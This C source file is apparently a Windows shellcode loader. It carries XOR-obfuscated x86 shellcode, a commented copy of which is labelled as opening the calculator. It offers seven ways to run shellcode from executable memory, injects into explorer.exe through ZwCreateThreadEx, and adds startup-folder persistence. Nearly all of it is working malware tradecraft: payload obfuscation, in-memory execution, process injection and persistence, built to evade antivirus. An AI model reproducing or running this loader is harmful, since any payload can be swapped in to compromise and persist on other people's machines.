#include<stdio.h>
#include<Windows.h>
#include"CodeInject.h"
#include"AutoRun.h"
#include"Main.h"

//#define ENCODE

// X86_32计算器
//unsigned char shellcode[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63\x00";
BYTE shellcode[] = { 0xfd,0xe9,0x88,0x1,0x1,0x1,0x61,0x88,0xe4,0x30,0xd3,0x65,0x8a,0x53,0x31,0x8a,0x53,0xd,0x8a,0x53,0x15,0x8a,0x73,0x29,0xe,0xb6,0x4b,0x27,0x30,0xfe,0x30,0xc1,0xad,0x3d,0x60,0x7d,0x3,0x2d,0x21,0xc0,0xce,0xc,0x0,0xc6,0xe3,0xf1,0x53,0x56,0x8a,0x53,0x11,0x8a,0x43,0x3d,0x0,0xd1,0x8a,0x41,0x79,0x84,0xc1,0x75,0x4b,0x0,0xd1,0x51,0x8a,0x49,0x19,0x8a,0x59,0x21,0x0,0xd2,0xe2,0x3d,0x48,0x8a,0x35,0x8a,0x0,0xd7,0x30,0xfe,0x30,0xc1,0xad,0xc0,0xce,0xc,0x0,0xc6,0x39,0xe1,0x74,0xf5,0x2,0x7c,0xf9,0x3a,0x7c,0x25,0x74,0xe3,0x59,0x8a,0x59,0x25,0x0,0xd2,0x67,0x8a,0xd,0x4a,0x8a,0x59,0x1d,0x0,0xd2,0x8a,0x5,0x8a,0x0,0xd1,0x88,0x45,0x25,0x25,0x5a,0x5a,0x60,0x58,0x5b,0x50,0xfe,0xe1,0x59,0x5e,0x5b,0x8a,0x13,0xea,0x87,0x5c,0x6b,0x0,0x8c,0x84,0xb8,0x1,0x1,0x1,0x51,0x69,0x30,0x8a,0x6e,0x86,0xfe,0xd4,0xba,0xf1,0xb4,0xa3,0x57,0x69,0xa7,0x94,0xbc,0x9c,0xfe,0xd4,0x3d,0x7,0x7d,0xb,0x81,0xfa,0xe1,0x74,0x4,0xba,0x46,0x12,0x73,0x6e,0x6b,0x1,0x52,0xfe,0xd4,0x62,0x60,0x6d,0x62,0x1,0x1 };

///////////////////////////////////////////////////

///////////////////////////////////////////////////

void XORrecoder()
{

	for (size_t i = 0; i < sizeof(shellcode); i++)
	{
#ifdef ENCODE
		shellcode[i] ^= 0xA;
		shellcode[i] ^= 0xB;
		shellcode[i] ^= 0xF;
		shellcode[i] ^= 0xF;
		printf("0x%x,", shellcode[i]);
#endif
		shellcode[i] ^= 0xF;
		shellcode[i] ^= 0xF;
		shellcode[i] ^= 0xB;
		shellcode[i] ^= 0xA;
		//printf("0x%x,", shellcode[i]);
	}
	putchar('\n');
}

bool ChangePageProtect(CodeBuffer Buffer)
{
	DWORD OldProtect = 0;
	VirtualProtect(Buffer.pBuffer, Buffer.BufferSize, PAGE_EXECUTE_READWRITE, &OldProtect);
	return TRUE;
}

/////////////////直接加载///////////////////

typedef void(__stdcall* CODE) ();
void RunShellCode_1()
{
	PVOID pBuffer = NULL;
	pBuffer = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pBuffer == NULL)
	{
		return;
	}
	memcpy(pBuffer, shellcode, sizeof(shellcode));

	CODE code = (CODE)pBuffer;

	code();

}

void RunShellCode_2()
{
	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
	ChangePageProtect(Buffer);
	((void(*)(void)) & shellcode)();
}


#ifndef _WIN64

void RunShellCode_3()
{
	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
	ChangePageProtect(Buffer);
	__asm
	{
		lea eax, shellcode
		jmp eax
	}
}

void RunShellCode_4()
{
	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
	ChangePageProtect(Buffer);
	__asm
	{
		lea eax, shellcode
		call eax
	}
}

void RunShellCode_5()
{
	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
	ChangePageProtect(Buffer);
	__asm
	{
		lea eax, shellcode
		push eax
		jmp dword ptr ds:[esp]
	}
}

void RunShellCode_6()
{
	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
	ChangePageProtect(Buffer);
	__asm
	{
		lea eax, shellcode
		push eax
		ret
	}
}

void RunShellCode_7()
{
	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
	ChangePageProtect(Buffer);
	__asm
	{
		mov eax, offset shellcode;
		_emit 0xFF;	
		_emit 0xE0;
	}
}

#else

#endif

////////////////////////////注入式加载///////////////////////////////

void InjectShellCode_1()
{
	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
	ChangePageProtect(Buffer);
	DWORD dwPid = GetProcessIdByProcessName(L"explorer.exe");
	CodeInject::ZwCreateThreadExCodeInject(dwPid, Buffer);
}

int main()
{
	XORrecoder();
	
#ifndef ENCODE

	AutoRun::StartUpFloderAutoRun(NULL, "AutoRun.exe");	//自启动
	//RunShellCode_1();
	RunShellCode_2();
	//RunShellCode_3();
	//RunShellCode_4();
	//RunShellCode_5();
	//RunShellCode_6();
	//RunShellCode_7();
	//InjectShellCode_1();
	

#endif

	return 0;
}